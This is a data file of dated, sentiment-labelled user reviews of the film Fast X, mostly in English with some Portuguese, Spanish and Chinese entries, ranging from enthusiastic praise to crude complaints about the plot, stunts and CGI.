"Aug 13, 2023",POSITIVE,"I've read quite a few mixed reviews on this installment of the franchise.  At this point, you should know what you're getting in to.  I think X is better than Fast 9, and I enjoyed the many callbacks to previous films.  The addition of new characters, as well as seeing some of the regulars grow a bit is welcomed.  Naturally there's action: great cars/motorcycles/trucks/planes/etc., fight scenes, music, and a visually stunning film.  

I'm a fan of the franchise, and I was not disappointed, seeing it twice on the big screen, and just receiving the DVD and going through the extra features (which are great)."
"Aug 13, 2023",POSITIVE,Loved it! It's an absolute must see if you are a Jason Mamoa fan!
"Aug 12, 2023",NEGATIVE,É dificil assistir um filme desses até o fim.
"Aug 11, 2023",NEGATIVE,"As crazy and outlandish as the last few movies were, and I didn't care much for them, this one is at least 100x worse. The fact that it's rated over half a star, and over 20% just shows you how much of a hold the industry has over the reviews. People have to be paid off to acknowledge this movie as anything other than pure trash, and I like awful and trashy movies, but not this one. Everything about it is way over done, the forced comedy is atrocious, and the casting is REALLY bad even though no cast could've saved this cesspool of crap! I really hope this is the last one in the series, as it needs to be scrapped ASAP!"
"Aug 11, 2023",NEGATIVE,Only gold thing was the Hawaiian. Talk about lame. Can't believe how the population has become more moron. I'm
"Aug 11, 2023",POSITIVE,"(I'm Mistletoe Virus I'm saying I like this movie!) this movie for the The Fanbase, Not To The General Audience. This is a movie that feels like a love letter to all fans out there. Fast x is not a complete movies! But this movie is fun!"
"Aug 11, 2023",NEGATIVE,"So bad, could not get past the first 5 minutes..."
"Aug 10, 2023",POSITIVE,"So much mistery about ""what is going to happen"", males the movie intressant, even having some stupid scenes, for exemple: a car is not stronger than two helicopters."
"Aug 9, 2023",POSITIVE,"the movie was very entertaining from start to finish but there were some slow parts here and there but overall its a solid 8.5/10 for me and easily my favorite movie i saw this year keep it up universal pictures, One race, and Original Film with the Fast and Furious franchise cant wait for fast X part two."
"Aug 9, 2023",POSITIVE,"Besides some very dumb parts of the plot this was actually one of the best action movies i've seen in a while. It has the best emotional moments since Fast 5 and Furious 7. I liked that the whole movie the team is separated in groups so you'll be much happier when they reunite for the final fight especially now with Gisele, Hobbs and most likely with Brian! I'm pretty sure they will bring him back with the help of Cody Walker, CGI and AI. This movie is literally all about family (Reyes Family) (Doms Family) (Elenas Sister) (Mr. Nobody's Daughter). The CGI was very bad at some moments and physics didn't exist! BUT i really hope the next one is the final movie because i can't see how they could do 2 more.."
"Aug 9, 2023",NEGATIVE,Whole movie was laughable - its almost campy now. When they went to space in F9 I thought “how can they top this?” And yet they found a way….. so baddd
"Aug 9, 2023",POSITIVE,"For me, this movie is actually quite decent, but it may not in favor for other you know. Cause each of individual have their own preferences i guess. But for me, the story is smooth, not much of hard plotting in the scene. It was a great movie to pass my free time of course while eating my noodles XD."
"Aug 9, 2023",NEGATIVE,"Dominique Toretto is back and his family. This time his team is sent on a mission in Rome, but it is a trap. Someone has set them up. There is a bomb, and car chases all over Rome. Cars are crashing, exploding, burning up. Rome is a mess.
    Enter Dante Reyes, (Jason Momoa) the son the late drug lord, Hernan Reyes. Dante holds Dom responsible for his father's death and Dante wants revenge, ""Blood"" Revenge He is determined to make Dom suffer, and watch all of his family suffer. 
  ""I am the man thats going to break your family, piece by piece"" - Dante
   Now everyone that Dom has ever cared about is in danger. Even Dom's enemies must become his allies. Dante will not stop. He is coming for everyone.
  ""The devil's coming"" - Cipher
    Fast X story is a bit choppy and all over the place and mostly repetitive and predictable. Actually it just looks like a bunch of random scenes put together with no real story. Oh and so many awesome actors with absolutely nothing to do. Then suddenly the movie just kind of ends with no warning?? That was strange. 

    But this is the Fast and Furious and so there is  lots and lots of car chases, lots of cameos and unbelievable and somewhat ridiculous car stunts and crashes.... And there is also Jason Momoa doing his best Joker.  A bit too much for me.     
    So what has happened to my Fast and Furious? I think I will go back and watch the original and forget I even watch this one.

   Cast -  Vin Diesel, Jordana Brewster, Michelle Rodriguez, Jason Momoa, John Cena, Jason Statham, Helen Mirren, Rita Moreno, Tyrese Gibson, Ludacris, Sung Kang"
"Aug 9, 2023",POSITIVE,I totally liked Fast X and the fast & furious franchise and i give this movie a solid 5 stars/two thumbs up can't wait to see the last two movies of this epic and fantastic franchise
"Aug 9, 2023",NEGATIVE,"It would be half a star, but seeing Han again was cool and Jason manias character was a proper villain.
The issue with this movie is that none of it's believable. The car scenes are awful, the action scenes are a bit lackluster, and even the CGI work looks pretty bad. Hard to believe the budget on this film couldn't afford better.

I'm a long time fan, I really wanted to like this film. Parts of it were great. But a LOT of it was terrible.
I miss the old fast and furious movies, with ridiculous body kits and neon lights, without all the super spy moves and seemingly unlimited explosions and celebrity cameos."
"Aug 8, 2023",NEUTRAL,"Fast X is a little better than some of the previous entries of the series that weren't good. But that doesn't mean Fast X is a great film overall, nor does it overshadow any of the greater films within the Fast saga. The story is outlandish despite having one good new addition with Jason Mamoa's character, and the rest of the cast play their parts just fine. The action is good if you're willing to go along with the crazy ride, but it still won't be for everyone who hasn't invested themselves in this series. As the first part of a promised finale, it would've been nicer to have a more solid conclusion to the film rather than a cliffhanger for the next sequel. Things just end abruptly and leave everyone hanging. The unfortunate truth is that if you didn't enjoy what you get in Fast X, you might not be coming back for the next one to see how it all ends."
"Aug 8, 2023",POSITIVE,"It's very bad movie, still fun to watch. Better than part 9. Momoa is the best, Diesel is the worst part. Everything is stupid af, but action is top notch."
"Aug 8, 2023",NEGATIVE,Just ridiculously stupid.
"Aug 8, 2023",POSITIVE,Glad to have Han backk🤩
"Aug 8, 2023",POSITIVE,The performances are top-notch. Each actor brings their character to life with nuance and depth.
"Aug 7, 2023",POSITIVE,Amo a franquia. O filme 10 foi excelente.
"Aug 7, 2023",NEGATIVE,Even transformers and super heroes got hurts and bruised in any fightings. Dom never got any scratches... And he drove without seat belt. This movie can join Bollywod. Even Bollywood is more realistic than Dom.
"Aug 7, 2023",POSITIVE,"There is no illusion for anyone's mind that the film in the Fast and furious are not just blockbuster. Also this film delivers on upping the ante with explosions and intricate fight choregraphy that will leave you pumped up.
In conclusion, I love this movie"
"Aug 7, 2023",POSITIVE,"Fasssssssst and fuuuuuuuurious, will they go space next round!?"
"Aug 7, 2023",NEGATIVE,It's like I'm watching a dogshow because of Dante..
"Aug 7, 2023",POSITIVE,"This movie was great I really liked how they went back to how fast five was. No crazy 
futuristic stunts that make zero sense. The movie was a good film and leaving it on a cliff hanger was a shock but makes it more eager to see the next one."
"Aug 6, 2023",POSITIVE,It was a good or like they say awesome movie i cant complain i enjoyed it they did what they did best action and it was good .
"Aug 6, 2023",NEGATIVE,"This series seems to get worse with every installment. So many bad tropes, such poor writing, so much overacting. Jason Momoa takes the Razzie for this movie, with his horrible overacting."
"Aug 6, 2023",NEGATIVE,"Absolute garbage, what a waste of a night out. Please end the series"
"Aug 6, 2023",POSITIVE,Good movie. I like the overall storyline and the effort on filming the movie with the supercars.
"Aug 6, 2023",NEGATIVE,"Fucking garbage, it was supposed to be the end, it's the only reason I watched."
"Aug 5, 2023",POSITIVE,The movie has a lot of good action，let feel family lover.
"Aug 5, 2023",POSITIVE,It suach an amazing movie！
"Aug 4, 2023",NEGATIVE,"The wheels have come off.
The Fast and Furious Franchise took a nose-dive with its 10th installment. Despite decent performances from the usual cast, and a surprisingly good turn by Jason Momoa as the villian, this was just awful. I felt like I was watching a parody film. The action sequences and stunts were cartoonish, exaggerated  beyond any ability to suspend disbelief. The cliffhanger ending was unexpected, and acutally kinda pissed me off. Rather than engendering a desire to know what comes next, I find myself indifferent. There is enough fan-service that long-time fans of the franchise will appreciate it, but still wont' like it."
"Aug 4, 2023",POSITIVE,"Que peliculón, cada vez son más absurdos pero eso es parte de la saga y ya hasta hacen chistes de eso, Jason momoa es el villano definitivo de esta saga, cada vez que él esta en pantalla es genial todo lo contario a cada vez que se queda solo en pantalla Vin Diesel con sus registros dramáticos horribles, independientemente de todo esto, cada vez los efectos son mejores y las carreras más emocionantes."
"Aug 4, 2023",POSITIVE,"Fast X is what it is, and that is an absurdly fun popcorn movie."
"Aug 4, 2023",POSITIVE,I love the movie 🍿 very nice very good 👍
"Aug 3, 2023",POSITIVE,"An Action movie that will entertain For the whole family, Once again, The best Fast and Furious Film I have seen!"
"Aug 3, 2023",POSITIVE,very good movie very entertaining!
"Aug 3, 2023",POSITIVE,"Nice movie, worth to watch it"
"Aug 3, 2023",POSITIVE,Great actors and movie.
"Aug 3, 2023",NEGATIVE,Fast X action is very good but action scene to much make me very tired of it so conclusion is this movie not very bad but also not very good
"Aug 3, 2023",POSITIVE,Surprise for your expectations every next coming up movie in this series.
"Aug 2, 2023",POSITIVE,"Ngl I was afraid this would suck and was a little over the Fast & Furious franchise, but after this movie I'm def excited for the next one!"
"Aug 2, 2023",POSITIVE,Cool movie must watch
"Aug 2, 2023",POSITIVE,the plot was intriguing
"Aug 2, 2023",NEUTRAL,"As an action movie it was pretty good. Like if you do not look at it as fast and furious the fights were cool kind of had me on the edge of my seat. So an action movie I would say about a 3.5 but as a fast and furious movie it was a one at most the only thing that made it a fast and furious movie was ""family"" the tiny bit of racing they did in Brazil."
"Aug 1, 2023",NEUTRAL,"More of the same...
Jason momoa shined in the art of acting and convinced me to be a ruthless villain.
If you like fast-paced action, this is the movie for you. But don't expect anything different from the other movies"
"Aug 1, 2023",POSITIVE,"Best movie, the scene of movie is crazy🔥🔥🔥"
"Aug 1, 2023",POSITIVE,"The cast is great, as always. Vin Diesel, Jason Momoa, and the rest of the gang all give great performances. The stunts are some of the most insane I've ever seen in a movie, and they're executed with a lot of skill and creativity. The story is a bit convoluted, but it's still entertaining. There are a lot of twists and turns, and the stakes are high. Overall, Fast X is a great popcorn movie. it's a lot of fun to watch."
"Jul 31, 2023",POSITIVE,The motion is fabulous. And it's a classic series that
"Jul 31, 2023",NEUTRAL,"Had a great time while watching this film but this film is comparable to Fast 9. Fast X is very predictable, too much plot going on. Some scenes doesn't even deserve to be in the film, it takes up too much time for the film. Dante was kind of a ""meh"", he talks too much. Dominic Toretto, once again, is a super-human with the power to bring character back to life."
"Jul 31, 2023",POSITIVE,I love the extreme racing car and can't wait to watch new series.👍👍👍
"Jul 31, 2023",NEGATIVE,I give it 2 stars because this fast and furious movie was not that memorable like the other movies and it showed 3 returning characters
"Jul 31, 2023",POSITIVE,"cuando vas a ver FAST X, vas a divertirte, a pasarla bien con tus amigos o familia, (opinion personal).Esta pelicula es muchisimo mejor que su antecesora, (Fast And Furious 9).

Esta pelicula me sorprendio mucho,
tiene muy buena accion.
muy buenos personajes.
el mejor villano de franquicia.
te la pasas bien viendola.
un muy buen elenco.
tiene muy buena trama comparada con las ultimas peliculas que han sacado.
y un final que te deja con ganas de ver la siguiente.

Lo unico malo que le encuentro a la pelicula.
(OPINION PERSONAL)
es el cgi.

Pero en si esta pelicula no es para ir a verla por la trama si no para divertirse, pasarla bien, etc

Al final de todo siempre vamos a decir, porque sacan tanta pelicula o que esta franquicia debio terminar en la 7 o entre otras cosas mas pero al final cuando ya acabe la franquicia, la vamos a extrañar."
"Jul 30, 2023",POSITIVE,"Fast X is so awesome lots of racing ,action and humor . Not a big fan of the actor who plays the villain in it I preferred him better as aquaman . Its one of my top 5 favorite movies out of the series. It shows family ,morals ,trust ,respect ,honor and legacy in this movie throughout the entire movie . If you are a Fast and Furious movie buff like me and have seen the ones before this one then Id highly recommend it. The ending of the cliffhanger really leaves you on the edge of your seat. Im not a big fan of cliffhangers but it makes you wonder I'm this movie who died the son or dad ? Did the dad take the bullet for his family legacy or did the son and dad find his way out . Im ready for the second half of the movie to find out what happened next ?"
"Jul 30, 2023",NEUTRAL,Fast X continues to give the people what they want in terms suspending disbelief.  The Reyes villain is one of the better foes in the entire series.  I will say bringing back characters that were believed to be dead is starting to get old.  I also they need to do something with the Brian character.  It makes no sense in this universe that he remains sidelined at this point.  They have got to do a better job explaining him being gone if they are not going kill the character off.
"Jul 30, 2023",NEUTRAL,I expect more action from this movie but this movie failed to serve me incredible action without science or logical sense.
"Jul 30, 2023",POSITIVE,"这个电影值得你们看,几乎从头到尾都很刺激,都在飙车"
"Jul 30, 2023",NEGATIVE,"This might be the dumbest thing I've ever seen. And yes, I know dumb action movies are supposed to be dumb. But this isnt just dumb. It makes me feel dumb watching it. Just so much dumb. Lazy, nonsensical dumb. It used to be fun dumb. I miss those days. Now I'm just dumb for still watching these expecting it not to be dumb."
"Jul 29, 2023",NEGATIVE,"Fast X takes you on a great ride with characters that you've known and loved for years. The action in this movie is what makes this movie and the whole franchise thrive currently. The ways the writers are able to come up with inventive and creative action sequences is insane. But there's so many issues with this movie when it comes to the generic story. The repetitive use of conflicts and tying the villains to someone from the family's past. It just feels redundant and lazy at this point. This movie does feel more grounded than the last movie but when it comes to logic. The movie is still silly, gimmicky, and makes Dom and his family seem invincible. This movie also continues to show that this franchise still has no stakes when it comes to the consequences of the characters actions. The threat in this movie isn't even felt by the end of this movie because of how logically ridiculous these movies have become. I think Jason Momoa as Dante is the standout character in this movie. He does bring stakes, but with this franchise, anyone can survive anything. But I do think his personality and the way he carries himself is what makes his character enjoyable and it seems like Momoa is just having fun in the role. Overall, this movie isn't one to take seriously, just to have some fun with some great cheesy action and familiar characters. C+"
"Jul 29, 2023",POSITIVE,"Dominic遇到各种挫折的无奈
他还是想办法把救出所爱的人
很多彩蛋&意想不到的人物出现"
"Jul 29, 2023",POSITIVE,FAST X is an exciting and futuristic transportation system that has the potential to transform the way we travel.
"Jul 28, 2023",POSITIVE,The movie was very good but it become more action than car racing.
"Jul 28, 2023",NEGATIVE,Cringe fest and timed missions  on saving whatever  or whoever from anyone that hates the FAMILY.
"Jul 28, 2023",POSITIVE,It is a very good movie to watch when we are having lots of stress . The fast and thrill will let us feel excited .
"Jul 28, 2023",NEGATIVE,"Should have ended this series on the 7th when Walker died. This movie isn't bad just not good. Too formulaic, it's hard to find anything interested when everything shown has been done before."
"Jul 27, 2023",NEGATIVE,So mid don't watch unless your a big fan and have to know
"Jul 27, 2023",NEGATIVE,"When the story finally concludes, this one won't be at the top of my rewatch list. Full of corny flashback scenes and predictable storylines. Maybe they redeem themselves in pt 2?"
"Jul 27, 2023",NEGATIVE,"This is the worst movies of them all Jason mamoa literally is the only good character  ….
cash grab movie 
If you think they went over the top in the last movies….they pass the bar in this one and not in a good way
 this  series should have ended when Brian/Paul died 
Like how is Mia still in the movies 
Let fast and furious Rest in peace please 
I feel if Paul was still alive the movies would not be like this"
"Jul 26, 2023",NEUTRAL,"I think the film was decent overall; I still don't know why they'd decide to finish it of like an episode in a tv show when it's a movie.
Also, the antagonist is poorly written; it almost like he's trying to be the joker from the original Batman films. At least for the most part I wasn't able to predict what came next like every other movie that came before this one this year."
"Jul 26, 2023",POSITIVE,what an excellent movie
"Jul 25, 2023",NEUTRAL,"Fast X knows what it is and unapologetically owns it. Is it absurd? Yes. Is it entertaining? Absolutely! This is a movie that plays to its fans, and you gotta give it credit for that. Jason Momoa is spectacular and stole the movie."
"Jul 25, 2023",POSITIVE,The movies is very nice ，and so many beautiful sport cars。
"Jul 25, 2023",NEGATIVE,"Never in my life have I seen a dumber movie than this.
It's even worse than its predecessors.
All the actors are swollen with botox and are caricatures of what they were even just 10 years ago.
The plot is non-existent and the dialogues seem written by a retarded child
Glad I saw it without paying a $"
"Jul 25, 2023",POSITIVE,nice movie. valuable to watch.
"Jul 25, 2023",POSITIVE,"The special effects scene also maintained a uniform level, and I feel that this time the details are handled better than the previous one. Whether it's the special effects or the control of the camera transition, done a very good job, and I have been staring intently at what is about to happen. The plot of the entire movie is intertwined, and the attention is always focused on the movie"
"Jul 24, 2023",NEGATIVE,This is not only the worst in the series but the worst movie I have ever seen in my life
"Jul 24, 2023",NEGATIVE,"Merda generalizada. A franquia se perdeu pra caramba, você olha o ritmo do 6 e nota uma diferença gritante entre a trama, o vilão os personagens."
"Jul 24, 2023",POSITIVE,Very exciting to watch and will watch again!
"Jul 24, 2023",POSITIVE,"Good movie, great actor."
"Jul 24, 2023",NEGATIVE,"This isn't a movie - it's a cartoon. The villan was funny enough, the rest was pretty painful to watch.

You know, where if a child decides to do an impossible jump from a moving supersonic jet and land on a train moving in the opposite direction, then CGI takes over and slows his path down and plots it so that he cannot fail.

Similarly, a car can be dropped by satellite, survive the landing with a little bounce before driving sideways up some stone steps with perfect control and carry on.

Similarly, if someone comes into your house and murders your whole family, when you corner them with your assault rifle - don't ever shoot. That would end the movie very quickly, as you MUST WAIT whilst they take advantage of frozen time and reveal their pre-planned response to this completely random occurance.

In short, I couldn't watch the movie exclusively - I was playing (and enjoying) a mobile game the entire time to make it bearable."
"Jul 23, 2023",NEGATIVE,"These movies keep getting worse. How do people still support these movies. Cheesy dialogue, obnoxious action scenes, and family haha. They should have stopped several movies ago."
"Jul 23, 2023",POSITIVE,Very exciting and fun to watch. Never get bored with this movie!
"Jul 23, 2023",POSITIVE,"An action-packed thrill ride with jaw-dropping stunts, a charismatic cast, and intense car chases. While the plot may be predictable, the film delivers on its promise of non-stop excitement and adrenaline-fueled fun."
"Jul 23, 2023",POSITIVE,"In general, I've loved Fast and Furious so this movie is great, and I like good action mixed with fast cars so.. yeah. Plus the story has me invested."
"Jul 23, 2023",NEUTRAL,"Nothing makes any sense, so your brain turns off and you can have a pretty fun time."
"Jul 22, 2023",POSITIVE,The movie was better then the first one Jason Momoa still the movie he his the prettiest bad guy it was the best action movie of all time to me 
"Jul 22, 2023",POSITIVE,good. It's a good movie
"Jul 22, 2023",NEGATIVE,So bad i turned it off
"Jul 21, 2023",NEUTRAL,"Sem duvidas, esse é menos pior que o anterior, mas continua, completamente sem noção alguma."
"Jul 21, 2023",POSITIVE,"Good. Exciting ""cliff""-hanger ;) can't wait for P2"
"Jul 21, 2023",NEGATIVE,Unbelievable villian.  Cheap and unrealistic cgi. Plot even more unrealstic
"Jul 21, 2023",NEGATIVE,"Fast X has finally gone too far. As I recall, people keep complaining that these movies are dumb, however, too often people dismiss the action charm and overcomplicated plots of crazy writers trying to show how smart they are. This time they really went too far.
Furthermore, they retell an old movie by adding scenes that didn't exist. Thus, once again, they were caught in a ""revenge plot"" and once again the family must unite to defeat evil. They literally revamped the plot the last 2-3 movies, but this time they got lazy!
So this was, overall, a very dull, uninteresting and boring disappointment, Fast  9 should have been the last one.

I'm not looking forward to sequels to this mess at all.
Português/Brasil:

Velozes e Furiosos X finalmente foi longe demais. Pelo que me lembro, as pessoas continuam reclamando que esses filmes são burros, no entanto, muitas vezes as pessoas descartam o charme da ação e os enredos supercomplicados de escritores malucos tentando mostrar o quão inteligentes eles são. Desta vez, eles realmente foram longe demais.
Ademais, eles recontam um filme antigo adicionando cenas que não existiam. Dessa forma, mais uma vez, eles foram pegos em uma ""trama de vingança"" e mais uma vez a família deve se unir para derrotar o mal. Eles literalmente reformularam o enredo dos últimos 2-3 filmes, mas desta vez ficaram preguiçosos!
Portanto esta foi, no geral, uma decepção muito chata, desinteressante e chata, o Velozes e Furiosos 9 deveria ter sido o último.

Não estou ansioso pelas sequências dessa bagunça, de jeito nenhum."
"Jul 21, 2023",NEUTRAL,"Si eres fan de la saga te la vas a pasar bien, si eres medio ""hater"" mejor no la vayas a ver, así de simple."
"Jul 21, 2023",NEGATIVE,This is clearly a case of diminishing returns at this point. Atleast it's an improvement from F9 and Momoa seems to be having a great time.
"Jul 21, 2023",POSITIVE,What a great show! Watch this movie with your friends or family to share a good moment with them!
"Jul 21, 2023",POSITIVE,"thrilling and action-packed ride that brings together a charismatic cast, breathtaking stunts, and a strong family theme"
"Jul 20, 2023",NEUTRAL,"Fast X is a fun time however lacks a true plot. Dom (Vin Diesel) is forced to confront his worst fear of losing his child when Dante Reyes (Jason Momoa),  who is ret-conned into Fast Five shows up to take revenge on Dom and extended family. That's it. Dom and his family spend the rest of the time running from and trying to outwit Dante to no avail. It does have one good twist at the end but if you look closer in the beginning, you can see it coming. Jason Mamoa is easily the best villain and best thing about this movie. The next best thing is Jakob (John Cena) and Little B's (Leo Abelo Perry) relationship. The action sequences are great, if not could be shortened to have some semblance of a plot. What I didn't expect is the the lack of chemistry between the long time cast members, specifically Roman (Tyrese Gibson) and Tej (Ludacris). Their interactions felt forced and off whereas in previous installments their interactions were very funny. Overall a good popcorn summer movie, but I expected better."
"Jul 20, 2023",NEGATIVE,It's like a 5 year old wrote and directed this movie. I am out of words for how bad this movie was.
"Jul 20, 2023",POSITIVE,"If you're a long time fan of the series, you'll appreciate the high octane and over the top action that doesn't take itself at all seriously.  If you're looking for a deep, character driven storyline, you're better off taking a different road my friend."
"Jul 20, 2023",POSITIVE,Very good and exciting 👍 I am the fans of the Fast and Furious and very miss they race together ❤️ hope to see you in the future
"Jul 20, 2023",NEGATIVE,"Its time for the this Franchise to hit the Emergency Brakes because its running out of gas , The formula is wearing thin the cast look too old , even the action scenes are overlong and boring. Also the fight scenes choppy editied and the only highlight is Jason Momoa chewing up the scenery as the the villian . I can't be bothered watching the other two of the trilogy past caring ."
"Jul 20, 2023",POSITIVE,Great movie. The flow is good and meaningful
"Jul 20, 2023",POSITIVE,Excellent movie!! Love it!! Heart pass up
"Jul 20, 2023",POSITIVE,Its an amazing movie. Its an action movie and the story is good. The Fast and the Furious franchise has had ups and downs from really interesting mediocre movies and all the actors play their role well and also coming soon for next season so I'm looking forward to also.
"Jul 19, 2023",POSITIVE,Went in with low standards and to my surprise it was a solid installment to the franchise! They set it up for a 11th movie so Im ready to see the next movie.
"Jul 19, 2023",NEUTRAL,"In a few words, we have the beginning of the end of the saga, and I have to say that, although it managed to entertain me and that I do believe that it is superior to its most recent predecessors, the film is a disaster that never knew what direction to take; if the course of explosive fun, or the one that develops a story where our characters are in danger. Jason Momoa as Dante Reyes is the highlight of the film, it is very fun to know his character; the action scenes are vibrant enough to keep one's attention; however, the movie becomes boring at times and so many things going on at the same time does not help it at all. I sincerely hope that in the future they manage to get back on track and be what they once were."
"Jul 19, 2023",NEGATIVE,Had to make an account just to review this garbage movie.
"Jul 19, 2023",POSITIVE,"""Fast X"" is a captivating and versatile movie that can appeal to a wide range of audiences. It seamlessly blends elements of drama and adventure, resulting in an enthralling cinematic experience. Directed by a visionary filmmaker, the movie stands out for its excellent storytelling, compelling performances, and thought-provoking themes."
"Jul 19, 2023",NEGATIVE,"Wow, this was the worst, most expensive garbage I’ve ever watched. The plot is completely incoherent, which is expected, and the action manages to be rote and ridiculous at the same time. I’ve been an increasingly grudging viewer of all the movies til this point but am going to have to call it now."
"Jul 19, 2023",POSITIVE,super nice! Recommended
"Jul 18, 2023",NEGATIVE,"When Toretto slid the torpedo on the ice like a hockey biscuit, I shut all my logic neurons. After that, everything is fine for me; just having fun. It is the most stupid movie they ever made, but it could have been good to watch in the theatre."
"Jul 18, 2023",NEGATIVE,"I couldn't even watch more than 5 minutes because of how cringe this movie is. 
It's like they asked a 3 year old to make a movie, and it wasn't even cute ironically. Don't waste your time or money on this garbage."
"Jul 18, 2023",NEGATIVE,"Its just beyond reality anymore, can no one die in these movies? At least Jason Momoa is having a blast"
"Jul 18, 2023",POSITIVE,One of the best Fast movies to date. The acting was tremendous. Jason Momoa was absolutely fantastic as the villain!
"Jul 17, 2023",NEGATIVE,Really bad and really bad ending
"Jul 17, 2023",POSITIVE,It's a very perfect movie
"Jul 17, 2023",POSITIVE,"Fast X delivers an exhilarating cinematic experience that will leave fans of the franchise on the edge of their seats. As the tenth installment in the long-running series, the movie continues to push the boundaries of what's possible in the world of high-speed car chases and adrenaline-fueled action."
"Jul 17, 2023",NEGATIVE,"Cansada de este tipo de películas , los muertos reviven para seguir en sus carreras de autos .. que desilusión"
"Jul 17, 2023",NEGATIVE,"Man this franchise is a joke - the first two, hell even Tokyo Drift were the only 3 truly about racing and cars. Everything after turned to drugs - grudges - family drama - guns and ridiculous unbelievable stunts that were never apart of the series before and now are the new normal over the years lol. Movies could've been so good but people are so use to this hollywood garbage that they think it's actually ""good entertainment.""

This movie is really only worth watching if you already invested a lot into the franchise, if its on T.V. or a very cheap rental lol. 3.5/10"
"Jul 17, 2023",NEGATIVE,"Absolutely shit. Jason Mamoa was probably the single worst person and had THE worst character I've ever seen. The director should consider other careers. Bare minimum effort on the cars, minimum effort on the plot, minimum effort on the whole project. Nice extended trailer, can't wait for the next one"
"Jul 17, 2023",NEGATIVE,"silly movie, feel like we've gone downhill since Tokyo Drift"
"Jul 16, 2023",POSITIVE,"It's crossed the line of being so bad it's good. Is it ridiculous at times? Yes. Did I enjoy it? Yes. Also shout-out to the villain for being funny, stylish and calling out toxic masculinity. I really hope in the next one he's like a hot bisexual or something because he's very gay-coded. Loved it, great to see in theaters!"
"Jul 16, 2023",NEGATIVE,terrible movie the acting and CGI was terrible.
"Jul 16, 2023",NEGATIVE,"Dom is rouge in 8, then Jacob in 9, now Dante in 10. Fast 8, 9, 10 are the same movies guys!  At least 5,6,7 had a different storyline. It doesn’t feel like a F&F Movie since fast 5 honestly. Should have stopped at Fast 6. I know Paul died in 7 and that movie was a huge cut and past job due to Paul’s death (RIP). I love part 1, 3, 4, & 5 especially 3, but it’s no longer fun or exciting to watch. I’m tired of Roman and Teg not doing anything other than argue since F&F 4. Han is back for now reason at all. Mia is absent. It’s like story telling recycled with a bottle already made from eco friendly plastic but with a new purpose. There is no more juice left over n these lemons."
"Jul 16, 2023",POSITIVE,"Just for support our idols, for content and acting really can't assume much also not much interesting, haha…"
"Jul 16, 2023",NEGATIVE,Why bring everyone back from the dead?
"Jul 15, 2023",NEGATIVE,"Please STOP!!!!
why is this still going it should have stopped after paul died its becoming more and more cringe to watch. the ridiculousness of the action is getting out of hand or just call it a superhero movie. I can not talk about the story b/c there is none."
"Jul 15, 2023",NEUTRAL,Went by quite fast full of over the top action which you always like to see. Story wise was basic i think but could potentially get better throughout the trilogy or sequal depending which route they go and make it make more sense. Was alot of chatacters that felt like glorified cameos that were not probally needed and new characters made for soul purpose of bringing a actor in but not necessarily help the story. Jason momoa was great for me he carried the whole film the way his character acted was great at some points i was routing for him. Was a good film and i enjoyed it but probally will make more senss story wise when next part comes out.
"Jul 15, 2023",POSITIVE,"Fast X is a high-octane thrill ride that will satisfy fans and newcomers alike. It successfully combines heart-stopping action, emotional depth, and a visually stunning presentation. Fast X proves that even after ten films, the franchise still has plenty of gas in the tank, and it's a must-watch for any adrenaline junkie or fan of the series. Highly Recommend !"
"Jul 15, 2023",NEUTRAL,"Could have been so much better… to many storylines and none got flushed out enough, They all seem rushed… and to much vfx… should have toned down some of the stunts and gone more practical effects and the rating would be totaly different.
Not Even top 5 fast movie this one…"
"Jul 15, 2023",POSITIVE,"Great movie effect, worth watching"
"Jul 15, 2023",POSITIVE,电影很好看很精彩，推荐推荐推荐The movie is very beautiful and wonderful. I recommend it.
"Jul 15, 2023",POSITIVE,Goood and interesting! Worth to watch it
"Jul 15, 2023",NEGATIVE,"Not often do I stop watching a movie but I did so on this occasion. The dialogs are terrible with a very poor attempt at humor. Fast X is just more of the same but worse than it's predecessors. Even the visual effects could be better. Any sense of realism has gone out the window. Perhaps if you're 10 years old you might enjoy the slow paced movie but if you are accustomed to a higher level of movies, pass on this one, it's a waste of time."
"Jul 15, 2023",NEGATIVE,"Fast X, the latest installment in the long-running Fast and the Furious franchise, follows a predictable pattern that has become all too familiar. While it delivers on the adrenaline-pumping action sequences and high-octane car chases that fans have come to expect, it fails to offer anything fresh or innovative. Sadly, the film falls victim to the pitfalls of its own success, presenting yet another poorly written script that relies heavily on overblown heroism and lacks originality.

One of the major drawbacks of Fast X is its portrayal of the characters. The film's insistence on glorifying its human protagonists to superhuman levels has long since crossed the boundaries of believability. While the franchise has always embraced a certain level of suspension of disbelief, Fast X takes it to a whole new extreme. The characters are presented as invincible beings capable of escaping death-defying situations with ease, which ultimately disconnects the audience from any genuine sense of tension or excitement.

Moreover, the script of Fast X suffers from a severe lack of creativity. It seems as though the writers took the formula that has worked in the past and merely transplanted it into a new location. The plot feels recycled, lacking any compelling twists or unexpected turns. There's an undeniable sense of déjà vu as the characters embark on another mission involving fast cars, international criminals, and high-stakes heists. It's disheartening to witness such a missed opportunity to inject new life into a franchise that desperately needs reinvention.

Fast X does manage to deliver on its promise of thrilling action sequences, with jaw-dropping car chases and explosive set pieces scattered throughout the film. However, even these adrenaline-fueled moments become repetitive after a while, as they follow a formulaic pattern that fails to offer any real surprises or memorable sequences.

In conclusion, Fast X represents a missed opportunity to revitalize a franchise that has become stagnant. Its poorly written script, overemphasis on heroism, and lack of originality make it yet another forgettable addition to the Fast and the Furious series. While fans of mindless action may find some enjoyment in the film's explosive moments, those seeking substance, innovation, and fresh storytelling will be left disappointed. It's high time for the franchise to hit the brakes and reevaluate its direction if it hopes to regain its former glory."
"Jul 15, 2023",NEGATIVE,"Since they love bringing so many characters in this franchise back from the dead and all of them survive ridiculous things all the time, it gets tiresome. While it is pure nonsense, one can't deny that these movies do remain fun and entertaining though, I'll give it that. Some of the action sequences were good and I liked Jason Momoa as the villain, although not really his lines that he was given. It was clever that they made the muscular leader of the agency one of the accomplices in the end to the main bad guy too. I also really liked seeing Jason Statham again and Jakob with Dominic's son together. I feel like they could've made an entire movie out of those two and just their adventure! Part of me didn't like that they killed him off like they did but whatever, because there are a lot of things in this movie to dislike even more (the odd transitions, the weird scene with them in London and Han gets high off a muffin but in the next scene he's fine, the movie being rushed and all over the place with where they go so fast, and of course the physics). And did I even hear a Star Wars tie fighter sound effect when they went through a tunnel?? You can have enough of a good time with this movie like most of the others but at the same time, I'm getting bothered by how far they keep relentlessly pushing things and therefore there's really not that much suspense anymore or straightforward practicality...I mean for real, what can kill Dominic Toretto at this point?? It's a mixed bag for me."
